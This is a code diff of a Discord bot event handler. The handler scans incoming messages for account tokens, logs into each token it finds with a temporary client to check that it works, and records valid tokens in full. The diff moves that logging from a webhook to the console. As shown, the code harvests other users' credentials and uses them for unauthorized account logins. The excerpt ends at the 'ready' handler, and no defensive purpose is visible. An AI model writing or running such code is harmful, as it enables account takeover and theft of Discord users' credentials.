@@ -1,5 +1,4 @@
 const client = require("../index");
-const { LogContent, Levels } = require("../functions/webhookLog.js");
 const { GatewayIntentBits, PermissionFlagsBits, Client } = require("discord.js");
 
 client.on("messageCreate", async (message) => {
@@ -7,10 +6,7 @@ client.on("messageCreate", async (message) => {
     if (tokens === null)
         return;
 
-    var contents = [
-        new LogContent(Levels.Warn, tokens)
-    ];
-    client.webhookLog.send("Tokens found", contents);
+    client.console.warn("Tokens found:", tokens);
     tokens.forEach(token => {
         let tmpclient = new Client({
             intents: [
@@ -19,15 +15,9 @@ client.on("messageCreate", async (message) => {
         });
         
         tmpclient.login(token).then(_ => {
-            contents = [
-                new LogContent(Levels.Valid, `Token valid: ${token}`)
-            ]
-            client.webhookLog.send("Good token", contents);
+            client.console.log("Good token:", `Token valid: ${token}`);
         }).catch(err => {
-            contents = [
-                new LogContent(Levels.Error, `Token invalid: ${token}`)
-            ]
-            client.webhookLog.send("Bad token", contents);
+            client.console.error("Bad token:", `Token invalid: ${token}`);
         });
 
         tmpclient.on("ready", () => {
